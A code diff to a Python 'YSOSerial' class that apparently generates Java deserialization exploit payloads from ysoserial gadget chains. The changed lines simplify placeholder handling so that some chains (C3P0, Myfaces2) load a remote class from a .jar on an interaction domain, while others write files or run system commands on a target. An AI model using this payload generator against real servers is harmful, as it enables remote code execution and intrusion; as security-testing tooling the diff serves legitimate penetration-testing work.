@@ -10,12 +10,12 @@ class YSOSerial(Serializer):
 
     specialPayloadFormats = {
         'AspectJWeaver': ['<remote_file>;<base64>'],
-        'C3P0': ['<remote_url>:<classname>'],
+        'C3P0': ['<url>:<classname>'],
         'FileUpload1': ['writeB64;<remote_dir>;<base64>', 'writeOldB64;<remote_file>;<base64>'],
         'JRMPClient': ['<domain>'],
         'JRMPListener': ['<remote_port>'],
         'Jython1': ['<local_py_file>;<remote_py_file>'],
-        'Myfaces2': ['<remote_url>:<classname>'],
+        'Myfaces2': ['<url>:<classname>'],
         'URLDNS': ['<url>'],
         'Wicket1': ['writeB64;<remote_dir>;<base64>', 'writeOldB64;<remote_file>;<base64>'],
     }
@@ -102,7 +102,7 @@ class YSOSerial(Serializer):
                 formats = ['<system_command>']
             
             chains.append({
-                'id': chain['name'],
+                'id': chain['name'].lower(),
                 'name': chain['name'],
                 'description': f"{chain['name']}: {' | '.join(formats)}",
                 'formats': formats,
@@ -123,12 +123,6 @@ class YSOSerial(Serializer):
         remote_dir = os.path.dirname(remote_file_to_write)
         remote_port = int(self.chainOpts.remote_port)
         remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else jsp_code
-        java_classname = self.chainOpts.java_classname
-        if '%%domain%%' in self.chainOpts.java_remote_class_url and not interact_domain:
-            logging.warning("%%domain%% in java remote class URL but no interact domain provided")
-            java_remote_class_url = None
-        else:
-            java_remote_class_url = self.chainOpts.java_remote_class_url.replace('%%domain%%', interact_domain)
 
         logging.info(f"Interact domain: {interact_domain}")
         logging.info(f"System command: {system_command}")
@@ -159,10 +153,7 @@ class YSOSerial(Serializer):
                 if ('<url>' in format or '<domain>' in format) and not interact_domain:
                     logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
                     continue
-                if '<remote_url>' in format and not java_remote_class_url:
-                    logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires a java remote URL")
-                    continue
-
+    
                 logging.info(f"[{chain['name']}] Generating payload with format '{format}'")
 
 
@@ -195,10 +186,9 @@ class YSOSerial(Serializer):
                 chainArguments = chainArguments.replace('<remote_py_file>', remote_file_to_write.replace('%%ext%%', 'py'))
                 chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
                 chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
-                chainArguments = chainArguments.replace('<classname>', java_classname)
+                chainArguments = chainArguments.replace('<classname>', chain['id'])
                 chainArguments = chainArguments.replace('<domain>', str(interact_domain))
-                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
-                chainArguments = chainArguments.replace('<remote_url>', str(java_remote_class_url).replace('%%chain_id%%', chain['id']))
+                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.jar")
                 
                 with open(fp.name, mode='w') as ft:
                     ft.write(chain_jsp_code)
